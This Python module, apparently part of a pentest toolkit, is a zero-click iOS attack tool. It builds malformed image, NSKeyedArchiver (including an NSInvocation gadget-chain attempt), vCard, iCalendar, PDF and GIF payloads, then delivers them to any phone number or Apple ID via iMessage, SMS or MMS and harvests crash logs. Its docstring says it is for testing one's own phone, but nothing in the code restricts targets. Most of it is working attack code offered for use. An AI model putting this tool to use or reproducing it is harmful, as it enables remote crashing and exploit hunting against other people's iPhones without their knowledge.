"""
ios_crash_research.py — iOS Zero-Click Attack Surface Research Module
WiZZA Pentest Toolkit

Tests own iPhone (12–17, any iOS, no jailbreak required) by:
  1. Crafting malformed iMessage/SMS/MMS payloads and sending to device
  2. Harvesting crash logs via libimobiledevice/iTunes backup
  3. Monitoring which processes crash (imagent, SpringBoard, etc.)
  4. Generating corpus of fuzzing payloads targeting known parser bugs
  5. NSKeyedUnarchiver payload crafting (FORCEDENTRY-class technique)
  6. vCard/vcalendar malformed data fuzzing
  7. Link preview metadata injection

Requirements (Linux/Mac):
  pip install pyidevice imessage-tools pillow
  apt install libimobiledevice-utils ifuse

Usage:
  from ios_crash_research import send_imessage_payload, harvest_crashes
  from ios_crash_research import gen_fuzzing_corpus, full_ios_research
"""

import os
import re
import json
import time
import struct
import random
import string
import shutil
import subprocess
import tempfile
import plistlib
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ── Payload Corpus ────────────────────────────────────────────────────────────

def gen_fuzzing_corpus(out_dir: str = "/tmp/wizza_ios_corpus") -> dict:
    """
    Generate a corpus of malformed payloads targeting iOS parser attack surfaces.
    Each payload targets a specific parser in imagent, SpringBoard, or MobileSMS.

    Attack surfaces covered:
      - JBIG2 / JPEG / PNG / HEIC image parsers (CoreImage)
      - NSKeyedUnarchiver (iMessage attachment deserialization)
      - vCard parser (AddressBook)
      - iCalendar/iCal parser (Calendar)
      - PDF parser (PDFKit)
      - Animated image (GIF/APNG) parser
      - Link preview metadata (Twitter Card / OG tags)
      - UIKit attributed string (NSAttributedString RTF)
    """
    Path(out_dir).mkdir(parents=True, exist_ok=True)
    corpus = {
        "out_dir": out_dir,
        "payloads": [],
        "timestamp": datetime.now().isoformat(),
    }

    # ── 1. Malformed JPEG payloads ────────────────────────────────────────────
    def make_jpeg(variant: str) -> bytes:
        # Valid JPEG header
        hdr = bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10])
        # JFIF identifier
        jfif = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'

        if variant == "overflow_height":
            # Height = 0xFFFF (65535) — triggers allocation overflow in some decoders
            sof = bytes([0xFF, 0xC0, 0x00, 0x11, 0x08,
                         0xFF, 0xFF,  # height = 65535
                         0x00, 0x01,  # width = 1
                         0x01, 0x01, 0x11, 0x00])
            return hdr + jfif + sof + bytes([0xFF, 0xD9])

        elif variant == "negative_length":
            # SOF marker with length=1 (below minimum of 8) → integer underflow
            sof = bytes([0xFF, 0xC0, 0x00, 0x01])
            return hdr + jfif + sof + bytes([0xFF, 0xD9])

        elif variant == "giant_exif":
            # APP1 (EXIF) with length claiming huge data
            app1 = bytes([0xFF, 0xE1, 0xFF, 0xFE])  # length=65534
            exif_hdr = b'Exif\x00\x00'
            payload = b'A' * 64  # Small actual data
            return hdr + jfif + app1 + exif_hdr + payload + bytes([0xFF, 0xD9])

        elif variant == "jbig2_trigger":
            # JBIG2 embedded in JPEG2000 (FORCEDENTRY technique class)
            # Not the actual 0-day but the structural approach
            jp2_sig = bytes([0x00, 0x00, 0x00, 0x0C, 0x6A, 0x50, 0x20, 0x20, 0x0D, 0x0A, 0x87, 0x0A])
            jbig2_box = bytes([0x00, 0x00, 0x00, 0x24, 0x72, 0x72, 0x65, 0x71])  # 'rreq' box
            jbig2_data = bytes([0x80]) + b'\x00' * 35  # malformed requirements box
            return jp2_sig + jbig2_box + jbig2_data

        elif variant == "heic_overflow":
            # HEIC/HEIF (ISO BMFF) with malformed box size
            # ftyp box claiming it's heic
            ftyp = bytes([0x00, 0x00, 0x00, 0x18,  # box size = 24
                          0x66, 0x74, 0x79, 0x70,  # 'ftyp'
                          0x68, 0x65, 0x69, 0x63,  # major brand 'heic'
                          0x00, 0x00, 0x00, 0x00,  # minor version
                          0x68, 0x65, 0x69, 0x63,  # compat brand
                          0x6D, 0x69, 0x66, 0x31])  # compat brand
            # mdat box with size=0 (extends to EOF) but EOF is immediate
            mdat = bytes([0x00, 0x00, 0x00, 0x00,  # size=0 (extends to EOF)
                          0x6D, 0x64, 0x61, 0x74])  # 'mdat'
            return ftyp + mdat

        return hdr + jfif + bytes([0xFF, 0xD9])

    for variant in ["overflow_height", "negative_length", "giant_exif",
                    "jbig2_trigger", "heic_overflow"]:
        data = make_jpeg(variant)
        fname = f"img_{variant}.jpg" if "heic" not in variant else f"img_{variant}.heic"
        fpath = os.path.join(out_dir, fname)
        with open(fpath, "wb") as f:
            f.write(data)
        corpus["payloads"].append({
            "file": fpath,
            "type": "image",
            "variant": variant,
            "target": "CoreImage / imagent attachment handler",
            "size": len(data),
        })

    # ── 2. NSKeyedUnarchiver payload (iMessage attachment) ────────────────────
    def make_nska_payload(variant: str) -> bytes:
        """
        Craft malformed NSKeyedArchiver plist payloads.
        imagent deserializes iMessage attachments via NSKeyedUnarchiver.
        Gadget chains in the Objective-C runtime can lead to RCE.
        """
        if variant == "class_swap":
            # Valid NSKeyedArchiver structure but with swapped class
            # NSMutableDictionary → NSMutableArray class swap
            plist_data = {
                "$version": 100000,
                "$archiver": "NSKeyedArchiver",
                "$top": {"root": {"CF$UID": 1}},
                "$objects": [
                    "$null",
                    {
                        "$class": {"CF$UID": 2},
                        "NS.objects": [{"CF$UID": 3}],
                    },
                    {
                        "$classname": "NSMutableArray",  # Claiming to be array
                        "$classes": ["NSMutableArray", "NSArray", "NSObject"],
                    },
                    "AAAA" * 100,  # Oversized string
                ]
            }
            return plistlib.dumps(plist_data, fmt=plistlib.FMT_BINARY)

        elif variant == "circular_ref":
            # Circular reference in CF$UID chain
            plist_data = {
                "$version": 100000,
                "$archiver": "NSKeyedArchiver",
                "$top": {"root": {"CF$UID": 1}},
                "$objects": [
                    "$null",
                    {
                        "$class": {"CF$UID": 2},
                        "child": {"CF$UID": 1},  # Points back to self
                    },
                    {
                        "$classname": "NSObject",
                        "$classes": ["NSObject"],
                    },
                ]
            }
            return plistlib.dumps(plist_data, fmt=plistlib.FMT_BINARY)

        elif variant == "out_of_bounds_uid":
            # CF$UID pointing beyond objects array
            plist_data = {
                "$version": 100000,
                "$archiver": "NSKeyedArchiver",
                "$top": {"root": {"CF$UID": 9999}},  # Way out of bounds
                "$objects": ["$null", "only_one_object"]
            }
            return plistlib.dumps(plist_data, fmt=plistlib.FMT_BINARY)

        elif variant == "gadget_chain_attempt":
            # NSInvocation gadget — known class used in deserialization exploits
            # This is the class that makes NSKeyedUnarchiver dangerous
            plist_data = {
                "$version": 100000,
                "$archiver": "NSKeyedArchiver",
                "$top": {"root": {"CF$UID": 1}},
                "$objects": [
                    "$null",
                    {
                        "$class": {"CF$UID": 2},
                        "NS.target": {"CF$UID": 3},
                        "NS.selector": "description",
                        "NS.arguments": {"CF$UID": 4},
                    },
                    {
                        "$classname": "NSInvocation",
                        "$classes": ["NSInvocation", "NSObject"],
                    },
                    {
                        "$classname": "NSObject",
                        "$classes": ["NSObject"],
                    },
                    {
                        "$classname": "NSArray",
                        "$classes": ["NSArray", "NSObject"],
                        "NS.objects": [],
                    },
                ]
            }
            return plistlib.dumps(plist_data, fmt=plistlib.FMT_BINARY)

        return b""

    for variant in ["class_swap", "circular_ref", "out_of_bounds_uid", "gadget_chain_attempt"]:
        data = make_nska_payload(variant)
        if data:
            fpath = os.path.join(out_dir, f"nska_{variant}.plist")
            with open(fpath, "wb") as f:
                f.write(data)
            corpus["payloads"].append({
                "file": fpath,
                "type": "nskeyedarchiver",
                "variant": variant,
                "target": "imagent / NSKeyedUnarchiver",
                "size": len(data),
            })

    # ── 3. vCard fuzzing payloads ─────────────────────────────────────────────
    vcard_variants = {
        "overflow_name": (
            "BEGIN:VCARD\r\nVERSION:3.0\r\n"
            f"FN:{'A' * 65536}\r\n"  # 64KB name
            "END:VCARD\r\n"
        ),
        "nested_vcard": (
            "BEGIN:VCARD\r\nVERSION:3.0\r\n"
            "BEGIN:VCARD\r\nVERSION:3.0\r\n"  # Nested BEGIN (invalid)
            "FN:Inner Card\r\n"
            "END:VCARD\r\n"
            "FN:Outer\r\n"
            "END:VCARD\r\n"
        ),
        "null_bytes": (
            "BEGIN:VCARD\r\nVERSION:3.0\r\n"
            "FN:Test\x00User\r\n"  # Null bytes in field
            "EMAIL:test\x00@example.com\r\n"
            "END:VCARD\r\n"
        ),
        "giant_photo": (
            "BEGIN:VCARD\r\nVERSION:3.0\r\nFN:Test\r\n"
            "PHOTO;ENCODING=BASE64;TYPE=JPEG:" + "A" * 100000 + "\r\n"
            "END:VCARD\r\n"
        ),
        "format_string": (
            "BEGIN:VCARD\r\nVERSION:3.0\r\n"
            "FN:%s%s%s%s%s%s%s%s%n%n%n\r\n"  # Format string attempt
            "END:VCARD\r\n"
        ),
    }

    for name, content in vcard_variants.items():
        fpath = os.path.join(out_dir, f"vcard_{name}.vcf")
        with open(fpath, "w", errors="replace") as f:
            f.write(content)
        corpus["payloads"].append({
            "file": fpath,
            "type": "vcard",
            "variant": name,
            "target": "AddressBook / VCardParser",
            "size": len(content),
        })

    # ── 4. iCalendar fuzzing payloads ─────────────────────────────────────────
    ical_variants = {
        "overflow_summary": (
            "BEGIN:VCALENDAR\r\nVERSION:2.0\r\n"
            "BEGIN:VEVENT\r\n"
            f"SUMMARY:{'B' * 65536}\r\n"
            "DTSTART:20260101T000000Z\r\n"
            "END:VEVENT\r\n"
            "END:VCALENDAR\r\n"
        ),
        "infinite_recurrence": (
            "BEGIN:VCALENDAR\r\nVERSION:2.0\r\n"
            "BEGIN:VEVENT\r\n"
            "SUMMARY:Meeting\r\n"
            "DTSTART:20260101T000000Z\r\n"
            "RRULE:FREQ=SECONDLY;COUNT=2147483647\r\n"  # Max int recurrence
            "END:VEVENT\r\n"
            "END:VCALENDAR\r\n"
        ),
        "negative_duration": (
            "BEGIN:VCALENDAR\r\nVERSION:2.0\r\n"
            "BEGIN:VEVENT\r\n"
            "SUMMARY:Test\r\n"
            "DTSTART:20260101T000000Z\r\n"
            "DURATION:-P99999999D\r\n"  # Negative duration
            "END:VEVENT\r\n"
            "END:VCALENDAR\r\n"
        ),
    }

    for name, content in ical_variants.items():
        fpath = os.path.join(out_dir, f"ical_{name}.ics")
        with open(fpath, "w") as f:
            f.write(content)
        corpus["payloads"].append({
            "file": fpath,
            "type": "icalendar",
            "variant": name,
            "target": "Calendar / libical parser",
            "size": len(content),
        })

    # ── 5. PDF payloads ────────────────────────────────────────────────────────
    def make_pdf(variant: str) -> bytes:
        if variant == "stack_overflow_name":
            # Deeply nested Name object (causes stack overflow in some parsers)
            nested = b"/" + b"A" * 512  # Very long name
            return (
                b"%PDF-1.4\n"
                b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
                b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
                b"3 0 obj\n<< /Type /Page /Parent 2 0 R "
                + b"/MediaBox [0 0 " + nested + b" 792] "
                + b">>\nendobj\n"
                b"xref\n0 4\n0000000000 65535 f\n"
                b"0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n"
                b"trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n200\n%%EOF\n"
            )
        elif variant == "xref_overflow":
            # xref table claiming 2^31 objects
            return (
                b"%PDF-1.4\n"
                b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
                b"xref\n0 2147483647\n"  # Claim 2^31-1 objects
                b"0000000000 65535 f\n"
                b"trailer\n<< /Size 2147483647 /Root 1 0 R >>\nstartxref\n9\n%%EOF\n"
            )
        return b"%PDF-1.4\n%%EOF\n"

    for variant in ["stack_overflow_name", "xref_overflow"]:
        data = make_pdf(variant)
        fpath = os.path.join(out_dir, f"pdf_{variant}.pdf")
        with open(fpath, "wb") as f:
            f.write(data)
        corpus["payloads"].append({
            "file": fpath,
            "type": "pdf",
            "variant": variant,
            "target": "PDFKit / CGPDFDocument",
            "size": len(data),
        })

    # ── 6. Animated GIF (heap spray candidate) ────────────────────────────────
    def make_gif(variant: str) -> bytes:
        header = b'GIF89a'
        if variant == "width_overflow":
            # Logical screen width/height = 0xFFFF
            lsd = struct.pack('<HHBBB', 0xFFFF, 0xFFFF, 0xF7, 0, 0)
            return header + lsd + b'\x3B'
        elif variant == "many_frames":
            # 65535 frames (forces large allocation in animator)
            lsd = struct.pack('<HHBBB', 1, 1, 0x00, 0, 0)
            frame = (
                b'\x21\xF9\x04\x00\x00\x00\x00\x00'  # GCE
                b'\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00'  # image desc
                b'\x02\x02\x4C\x01\x00'  # LZW data
            )
            return header + lsd + frame * 255 + b'\x3B'
        return header + b'\x3B'

    for variant in ["width_overflow", "many_frames"]:
        data = make_gif(variant)
        fpath = os.path.join(out_dir, f"gif_{variant}.gif")
        with open(fpath, "wb") as f:
            f.write(data)
        corpus["payloads"].append({
            "file": fpath,
            "type": "gif",
            "variant": variant,
            "target": "UIImage / ImageIO GIF decoder",
            "size": len(data),
        })

    print(f"[+] Generated {len(corpus['payloads'])} payloads in {out_dir}")
    return corpus


# ── Send iMessage Payload ─────────────────────────────────────────────────────

def send_imessage_payload(target: str, payload_path: str,
                          message: str = "") -> dict:
    """
    Send a crafted file to target iPhone via iMessage (requires Mac).
    Uses AppleScript via osascript to send through Messages.app.

    target: phone number or Apple ID email
    payload_path: path to crafted payload file
    message: optional text to accompany the attachment
    """
    result = {
        "target":   target,
        "payload":  payload_path,
        "sent":     False,
        "method":   None,
        "error":    None,
    }

    # Method 1: AppleScript via Messages.app (macOS only)
    applescript = f'''
tell application "Messages"
    set targetService to 1st service whose service type = iMessage
    set targetBuddy to buddy "{target}" of targetService
    set theFile to POSIX file "{os.path.abspath(payload_path)}"
    send theFile to targetBuddy
    {"send \"" + message + "\" to targetBuddy" if message else ""}
end tell
'''
    try:
        proc = subprocess.run(
            ["osascript", "-e", applescript],
            capture_output=True, text=True, timeout=30
        )
        if proc.returncode == 0:
            result["sent"]   = True
            result["method"] = "applescript_messages"
            return result
        result["error"] = proc.stderr.strip()
    except FileNotFoundError:
        result["error"] = "osascript not found (not on macOS)"
    except Exception as e:
        result["error"] = str(e)

    # Method 2: SMS via AT commands (if USB modem available)
    try:
        proc = subprocess.run(
            ["which", "gammu"],
            capture_output=True, text=True
        )
        if proc.returncode == 0:
            # gammu sendmms or sendsms
            pass
    except Exception:
        pass

    return result


def send_sms_payload(target: str, message: str,
                     modem_port: str = "/dev/ttyUSB0") -> dict:
    """
    Send crafted SMS via AT commands or gammu.
    Tests SMS parser on target device.
    """
    result = {"target": target, "sent": False, "method": None, "error": None}

    # Try gammu
    try:
        proc = subprocess.run(
            ["gammu", "--sendsms", "TEXT", target, "-text", message],
            capture_output=True, text=True, timeout=30
        )
        if proc.returncode == 0:
            result["sent"]   = True
            result["method"] = "gammu"
            return result
        result["error"] = proc.stderr[:200]
    except FileNotFoundError:
        pass

    # Try AT commands directly
    try:
        import serial
        with serial.Serial(modem_port, 9600, timeout=5) as s:
            s.write(b'AT+CMGF=1\r\n')  # Text mode
            time.sleep(0.5)
            s.write(f'AT+CMGS="{target}"\r\n'.encode())
            time.sleep(0.5)
            s.write(message.encode() + bytes([0x1A]))  # CTRL+Z to send
            time.sleep(3)
            resp = s.read(256).decode(errors="replace")
            if "+CMGS" in resp:
                result["sent"]   = True
                result["method"] = "at_commands"
    except ImportError:
        result["error"] = "pyserial not installed"
    except Exception as e:
        result["error"] = str(e)

    return result


# ── Crash Log Harvesting ──────────────────────────────────────────────────────

def harvest_ios_crashes(udid: str = None,
                        out_dir: str = "/tmp/wizza_ios_crashes") -> dict:
    """
    Harvest crash logs from connected iPhone via libimobiledevice.
    Requires: libimobiledevice-utils (idevicecrashreport)

    Returns dict of crash reports organized by process name.
    """
    Path(out_dir).mkdir(parents=True, exist_ok=True)
    result = {
        "crashes":   {},
        "total":     0,
        "processes": [],
        "errors":    [],
    }

    # Try idevicecrashreport
    cmd = ["idevicecrashreport", "-e", out_dir]
    if udid:
        cmd += ["-u", udid]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if proc.returncode != 0 and "No device found" in proc.stderr:
            result["errors"].append("No iPhone connected via USB")
            result["errors"].append("Connect iPhone and trust this computer")
            return result
    except FileNotFoundError:
        result["errors"].append("idevicecrashreport not found")
        result["errors"].append("Install: apt install libimobiledevice-utils")

    # Parse crash reports
    target_processes = [
        "imagent", "MobileSMS", "SpringBoard", "backboardd",
        "BlueTool", "wifid", "CommCenter", "mediaserverd",
        "MobileMailHelper", "Facetime", "WebKit",
    ]

    for fname in os.listdir(out_dir):
        if not fname.endswith((".crash", ".ips", ".log")):
            continue
        fpath = os.path.join(out_dir, fname)
        try:
            with open(fpath, "r", errors="replace") as f:
                content = f.read()

            # Extract process name
            proc_match = re.search(r'Process:\s+(\S+)', content)
            proc_name  = proc_match.group(1) if proc_match else "unknown"

            # Extract exception type
            exc_match = re.search(r'Exception Type:\s+(.+)', content)
            exc_type  = exc_match.group(1).strip() if exc_match else "unknown"

            # Extract crash address
            addr_match = re.search(r'Exception Subtype:.*?0x([0-9a-f]+)', content)
            crash_addr = addr_match.group(1) if addr_match else None

            # Check if it's a target process
            is_target = any(t.lower() in proc_name.lower() for t in target_processes)

            entry = {
                "file":       fname,
                "process":    proc_name,
                "exception":  exc_type,
                "crash_addr": crash_addr,
                "is_target":  is_target,
                "size":       len(content),
                "snippet":    content[:300],
            }

            if proc_name not in result["crashes"]:
                result["crashes"][proc_name] = []
            result["crashes"][proc_name].append(entry)
            result["total"] += 1

            if proc_name not in result["processes"]:
                result["processes"].append(proc_name)

        except Exception as e:
            result["errors"].append(f"{fname}: {e}")

    # Highlight interesting crashes
    result["interesting"] = [
        e for crashes in result["crashes"].values()
        for e in crashes
        if e["is_target"] and e["exception"] not in ("", "unknown")
    ]

    return result


# ── Backup-based Crash Monitoring ─────────────────────────────────────────────

def monitor_via_backup(interval: int = 30, duration: int = 300,
                       udid: str = None) -> dict:
    """
    Repeatedly trigger backup sync and collect crash logs.
    Works without jailbreak — iTunes/libimobiledevice backup
    includes crash logs in DiagnosticReports.

    interval: seconds between backup syncs
    duration: total monitoring duration in seconds
    """
    result = {
        "duration":     duration,
        "syncs":        0,
        "new_crashes":  [],
        "seen_files":   set(),
    }

    crash_dir = "/tmp/wizza_ios_monitor"
    Path(crash_dir).mkdir(parents=True, exist_ok=True)
    end_time = time.time() + duration

    print(f"[*] Monitoring iOS crashes for {duration}s (sync every {interval}s)")

    while time.time() < end_time:
        # Trigger crash log pull
        cmd = ["idevicecrashreport", "-e", crash_dir]
        if udid:
            cmd += ["-u", udid]
        try:
            subprocess.run(cmd, capture_output=True, timeout=30)
        except Exception:
            pass

        # Check for new crash files
        for fname in os.listdir(crash_dir):
            if fname not in result["seen_files"]:
                result["seen_files"].add(fname)
                fpath = os.path.join(crash_dir, fname)
                try:
                    with open(fpath, "r", errors="replace") as f:
                        content = f.read()
                    proc_match = re.search(r'Process:\s+(\S+)', content)
                    proc_name  = proc_match.group(1) if proc_match else "unknown"
                    exc_match  = re.search(r'Exception Type:\s+(.+)', content)
                    exc_type   = exc_match.group(1).strip() if exc_match else "unknown"
                    result["new_crashes"].append({
                        "file":      fname,
                        "process":   proc_name,
                        "exception": exc_type,
                        "time":      datetime.now().isoformat(),
                    })
                    print(f"  [!] NEW CRASH: {proc_name} — {exc_type}")
                except Exception:
                    pass

        result["syncs"] += 1
        remaining = int(end_time - time.time())
        print(f"  Sync #{result['syncs']} done. {len(result['new_crashes'])} crashes. {remaining}s remaining.")
        time.sleep(interval)

    return result


# ── MMS Payload Sender ────────────────────────────────────────────────────────

def send_mms_payload(target_number: str, payload_path: str,
                     carrier_mmsc: str = "http://mms.example.com/mms/wapenc",
                     proxy: str = None) -> dict:
    """
    Send crafted MMS message to target phone number.
    MMS is processed by MobileSMS — a separate attack surface from iMessage.
    Requires: mmsd or python-mmscli

    carrier_mmsc: your carrier's MMS center URL (check APN settings)
    """
    result = {
        "target":   target_number,
        "payload":  payload_path,
        "sent":     False,
        "error":    None,
    }

    # Build MMS PDU
    try:
        from mmsd import MMSMessage  # type: ignore
        msg = MMSMessage()
        msg.add_attachment(open(payload_path, "rb").read(),
                           content_type="image/jpeg",
                           filename=os.path.basename(payload_path))
        pdu = msg.encode()

        # Send via MMSC
        import urllib.request
        req = urllib.request.Request(
            carrier_mmsc,
            data=pdu,
            headers={"Content-Type": "application/vnd.wap.mms-message",
                     "X-Wap-Profile": "http://wap.sonyericsson.com/UAProf/R800iProf.xml"}
        )
        if proxy:
            req.set_proxy(proxy, "http")
        resp = urllib.request.urlopen(req, timeout=30)
        result["sent"]  = True
        result["response"] = resp.read(200).hex()

    except ImportError:
        result["error"] = "mmsd not installed — pip install python-mmsd"
    except Exception as e:
        result["error"] = str(e)

    return result


# ── Full iOS Research Session ─────────────────────────────────────────────────

def full_ios_research(target: str, udid: str = None,
                      monitor_duration: int = 120) -> dict:
    """
    Full automated iOS zero-click research session:
    1. Generate payload corpus
    2. Send payloads to target
    3. Monitor for crashes
    4. Report findings
    """
    result = {
        "target":    target,
        "timestamp": datetime.now().isoformat(),
        "corpus":    {},
        "sent":      [],
        "crashes":   {},
        "findings":  [],
    }

    print(f"[*] iOS zero-click research session")
    print(f"    Target: {target}")
    print(f"    UDID:   {udid or 'auto-detect'}")

    print("\n[1/3] Generating payload corpus...")
    result["corpus"] = gen_fuzzing_corpus()

    print(f"\n[2/3] Sending {len(result['corpus']['payloads'])} payloads...")
    for payload in result["corpus"]["payloads"]:
        sent = send_imessage_payload(target, payload["file"])
        result["sent"].append({
            "payload": payload["variant"],
            "type":    payload["type"],
            "result":  sent,
        })
        time.sleep(2)  # Small delay between payloads

    print(f"\n[3/3] Monitoring for crashes ({monitor_duration}s)...")
    result["crashes"] = harvest_ios_crashes(udid)

    # Correlate crashes with sent payloads
    for crash in result["crashes"].get("interesting", []):
        result["findings"].append({
            "severity": "HIGH" if "imagent" in crash["process"].lower() else "MEDIUM",
            "process":  crash["process"],
            "exception": crash["exception"],
            "note":     "Process crashed during payload delivery window",
        })

    print(f"\n[+] Session complete. {len(result['findings'])} potential findings.")
    return result


# ── Self-test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== ios_crash_research.py self-test ===\n")

    print("[1] Generating fuzzing corpus...")
    corpus = gen_fuzzing_corpus()
    print(f"    Generated {len(corpus['payloads'])} payloads:")
    for p in corpus["payloads"]:
        print(f"      [{p['type']:15}] {p['variant']:30} → {p['target']}")

    print("\n[2] Checking libimobiledevice...")
    try:
        out = subprocess.check_output(["idevice_id", "-l"],
                                       text=True, timeout=5)
        devices = [l.strip() for l in out.splitlines() if l.strip()]
        print(f"    Connected devices: {devices or ['none']}")
    except FileNotFoundError:
        print("    idevice_id not found — install: apt install libimobiledevice-utils")
    except Exception as e:
        print(f"    Error: {e}")

    print("\nDone.")
